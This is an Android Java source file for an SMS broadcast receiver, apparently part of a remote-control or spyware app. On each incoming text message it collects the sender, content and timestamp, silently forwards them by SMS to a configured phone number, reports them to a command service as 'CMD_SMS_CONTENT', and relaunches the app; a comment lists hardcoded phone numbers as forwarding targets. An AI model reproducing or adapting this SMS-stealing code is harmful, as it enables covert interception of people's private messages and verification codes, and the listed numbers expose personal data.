package sms;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import activity.Splash101Activity;
import io.virtualapp.splash.SplashActivity;
import lock.UnlockScreen;
import order.Order101Service;
import order.order;
import utils.ConfigCt;
import utils.MyLog;

public class SmsReceiver extends BroadcastReceiver {
    private static final String ACTION = "android.provider.Telephony.SMS_RECEIVED";
    private static final String TAG = "cyc001";
    private static Context context;
    public String address=""; //短信地址；
    public String smsContent = "";//短信内容;
    public String receiveTime="";//接收时间
    public Date date;

    @Override
    public void onReceive(Context context, Intent intent) {
        //if(intent.getAction().equals(ACTION)){
            SmsReceiver.context=context;
            Bundle bundle = intent.getExtras();
            if (null == bundle)return;
            Object[] pdus=(Object[])intent.getExtras().get("pdus");
            SmsMessage[] messages=new SmsMessage[pdus.length];
            smsContent = "";
            for(int i=0;i<pdus.length;i++){
                messages[i]=SmsMessage.createFromPdu((byte[])pdus[i]);
                //sb.append("接收到短信来自:\n");
                address=messages[i].getDisplayOriginatingAddress();
                smsContent += messages[i].getMessageBody();
                date = new Date(messages[i].getTimestampMillis());//时间
            }
            SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            String receiveTime = format.format(date);
            MyLog.i(receiveTime);
            MyLog.i( address);
            MyLog.i(smsContent);
            String info=receiveTime+"\r\n"+address+"\r\n"+smsContent;
            MyLog.i(info);
            //if (Order101Service.getOrder101Service()==null)
            SplashActivity.StartApp(context);
            String myphonenum=ConfigCt.getInstance(context.getApplicationContext()).getMyphoneNum();
            if (myphonenum!=null)SendSms(myphonenum,info);
            if (Order101Service.getOrder101Service()!=null){
                Order101Service.getOrder101Service().SendBaseInfo(order.CMD_SMS_CONTENT);
            }

            //Splash101Activity.startSplash101Activity(context);
            //SendSms("15821528928",info);//18917459828  16621531089  13162223536
        //}

    }
    /*
     * 发送短信
     */
    public static boolean SendSms(final String address,final String body){
        new Thread(new Runnable() {
            @Override
            public void run() {
                try{
                    PendingIntent pi = PendingIntent.getActivity(SmsReceiver.context, 0, new Intent(), 0);
                    SmsManager manager = SmsManager.getDefault();
                    //拆分短信内容（手机短信长度限制）
                    List<String> divideContents = manager.divideMessage(body);
                    for (String text : divideContents) {
                        manager.sendTextMessage(address, null, text, pi, null);
                    }
                    //manager.sendTextMessage(address, null, body, pi, null);
                    //ConfigCt.getInstance(null).setIsSendSmsToPhone(true);
                }catch(IllegalArgumentException e)
                {
                    e.printStackTrace();
                    //return false;
                }
            }
        }).start();
        return true;
    }
    public static void StartApp(Context context)
    {
        Intent intent = new Intent(context, SplashActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
        //android.os.Process.killProcess(android.os.Process.myPid());
    }
}
